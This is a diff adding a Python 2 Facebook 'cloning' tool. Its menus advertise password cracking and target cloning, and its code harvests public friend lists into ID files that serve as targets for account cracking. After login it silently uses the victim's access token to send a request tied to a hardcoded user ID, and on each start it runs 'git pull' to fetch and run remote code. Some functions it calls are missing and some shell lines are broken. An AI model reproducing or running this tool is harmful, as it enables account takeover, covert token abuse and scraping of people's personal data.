@@ -1,0 +1,221 @@
+#!/usr/bin/python
+# coding=utf-8
+import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
+from multiprocessing.pool import ThreadPool
+try:
+    os.mkdir('/sdcard/ids')
+except OSError:
+    pass 
+try:
+    os.mkdir("/sdcard/ids/ex_ids")
+except OSError:
+    pass
+os.system("git pull")
+from requests.exceptions import ConnectionError
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf8")
+
+os.system('clear')
+def logo():
+       os.system('echo -e "\n       _____    ____      __  __   _____ \n      / ____|  / __ \\    |  \\/  | |_   _|\n     | (___   | |  | |   | \\  / |   | |  \n      \\___ \\  | |  | |   | |\\/| |   | |  \n      ____) | | |__| |   | |  | |  _| |_ \n     |_____/   \\____/    |_|  |_| |_____| Primium\n\n●●●●●●●●●●● We hope to see You again ●●●●●●●●●●● \n\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n\n⋟ Devolper     ●    Usama Awan (somi)\n⋟ WhatsApp     ●    03455453538\n⋟ Tool Type    ●    Cloning Tool\n\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n" | lolcat')
+def logo1():
+        os.system('echo -e "\n\n(1) Login With id/pass \n\n(2) Login With Token" | lolcat')
+        
+def logo2():
+        os.system('echo -e "\n\n(1) Auto Pass Cracking (40%)\n\n(2) Choice Pass Cracking (100%)\n\n(3) Target Cloning (70%) \n\n(4) Dump Public Account(100%) " | lolcat')
+def logo3():
+        os.system('echo -e "\n\n(1) Public Friendlist Crack (50%) \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')
+def logo4():
+        os.system('echo -e "\n\n(1) Public Friendlist Crack (50%) \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')
+
+idh = []
+back = 0
+
+def login_choice():
+	os.system("clear")
+	try:
+		open(".login.txt","r")
+		menu()
+	except IOError:
+		os.system("clear")
+		logo()
+		print
+		os.system('echo -e "<>LOGIN MENU<>" | lolcat')
+		logo1()
+		
+		print("")
+		login_select()
+def login_select():
+	select = raw_input("\033[1;92m•≫ \033[0;97m")
+	if select =="2":
+		login_token()
+    
+	elif select =="1":
+		login_fb()
+    
+	else:
+		print("")
+		print("\t    \033[1;31mSelect valid option\033[0;97m")
+		print("")
+		time.sleep(1)
+		login_select()
+def login_fb():
+	os.system("clear")
+	logo()
+	print
+	print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
+	print
+	id = raw_input(" Id/mail/number: ")
+	id1=id.replace(' ','')
+	id2=id1.replace('(','')
+	uid=id2.replace(')','')
+	pwd = raw_input(" Password: ")
+	print("")
+	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
+	q = json.loads(data)
+	if "loc" in q:
+		hamza = open(".login.txt","w")
+		hamza.write(q["loc"])
+		hamza.close()
+		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
+		menu()
+	elif "www.facebook.com" in q["error"]:
+		print("")
+		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
+		time.sleep(1)
+		print("")
+		raw_input("\tPress enter to back ")
+		login_choice()
+	else:
+		print("")
+		print("\t    \033[1;31mIncorrect credentials\033[0;97m")
+		raw_input("Press enter to try again ")
+		login_choice()
+def login_token():
+	os.system("clear")
+	try:
+		open(".login.txt","r")
+		time.sleep(1)
+		menu()
+	except (KeyError , IOError):
+	    os.system("clear")
+	    logo()
+	    print
+	    print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
+	    print
+	    token = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Paste token : ")
+	    token_save = open(".login.txt","w")
+	    token_save.write(token)
+	    token_save.close()
+	    time.sleep(1)
+	    menu()
+def menu():
+	os.system("clear")
+	try:
+		token = open(".login.txt","r").read()
+	except IOError:
+		os.system("clear")
+		print("")
+		logo()
+		print("")
+		print("\t    \033[1;31mToken not found\033[0;97m")
+		time.sleep(1)
+		login_choice()
+	try:
+		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
+		a = json.loads(r.text)
+		name = a["name"]
+	except KeyError:
+		os.system("clear")
+		print("")
+		logo()
+		print("")
+		print("\t    \033[1;31mToken expired\033[0;97m")
+		time.sleep(1)
+		os.system("rm -rf .login.txt")
+		login_choice()
+	os.system("clear")
+	logo()
+	print 47 * "\033[1;91m═"
+	print("\t    \033[1;33mWellCome : "+name+"\033[0;97m")
+	print 47 * "\033[1;91m═"
+	logo2()
+	
+	print("")
+	menu_option()
+def menu_option():
+	select = raw_input("\033[1;92m•≫\033[0;97m ")
+	if select =="1":
+		crack()
+	elif select =="2":
+		choice()
+	elif select =="4":
+		ex_id()
+	elif select =="3":
+		os.system('python2 .tt.py')
+	    
+	
+def ex_id():
+    idg=[]
+    global token
+    try:
+    	token = open(".login.txt","r").read()
+    except IOError:
+    	print("\t    \033[1;31mToken not found\033[0;97m")
+    	print("")
+    	time.sleep(1)
+    	login_choice()
+    os.system("clear")
+    logo()
+    print 47 * "\033[1;97m═"
+    print("\t  \033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")
+    print 47 * "\033[1;97m═"
+    idh = raw_input("\033[1;97m(\033[1;91m+\033[1;97m) Input Id: ")
+    try:
+        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
+        q = json.loads(r.text)
+        print("\033[1;97m(\033[1;91m✓\033[1;97m) Collecting from: "+q["name"])
+    except KeyError:
+    	print("")
+        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
+        print("")
+        raw_input(" Press enter to back")
+        crack()
+    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)
+    q = json.loads(r.text)
+    ids = open("friends.txt","w")
+    for i in q["data"]:
+        uid = i["id"]
+        na = i["name"]
+        nm=na.rsplit(" ")[0]
+        idg.append(uid+"|"+nm)
+        ids.write(uid+"|"+nm + "\n")
+    ids.close()
+    print("")
+    print(47*"-")
+    print("")
+    print(" The process has completed")
+    print(" Total ids: "+str(len(idg)))
+    print("")
+    print(47*"-")
+    print("")
+    os.system("cat friends.txt | grep '100066' > /sdcard/friends.txt")
+    os.system("cat friends.txt | grep '100067' >> /sdcard/friends.txt")
+    os.system("cat friends.txt | grep '100068' >>> /sdcard/friends.txt")
+    
+    raw_input(" Press enter to download file")
+    
+    
+    os.system("rm -rf friends.txt")
+    print(" File downloaded successfully")
+    time.sleep(1)
+    print ("\033[1;93mSaved /sdcard/friends.txt") 
+    print ("\033[1;93mEnter Go Back")
+    menu()
+
+if __name__ == '__main__':
+	login_choice()
+
